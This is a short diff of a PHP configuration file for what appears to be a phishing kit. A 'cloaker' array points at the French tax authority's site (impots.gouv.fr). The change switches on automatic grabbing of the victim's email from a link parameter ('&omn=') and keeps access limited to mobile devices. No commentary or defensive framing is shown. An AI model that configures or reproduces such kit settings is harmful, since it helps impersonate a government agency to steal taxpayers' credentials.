@@ -36,9 +36,9 @@ $cloaker = [
     "url_to_grab" => "https://www.impots.gouv.fr/professionnel/", // Change the link you want to grap it in your link ( if t)
 ];
 
-$auto_grabber = False; // Activate Auto Grab Email
+$auto_grabber = true; // Activate Auto Grab Email
 
-$auto_grabber_code = "#";
+$auto_grabber_code = "&omn=";
 
 $mobile_access = True; // Access only from mobile device
 
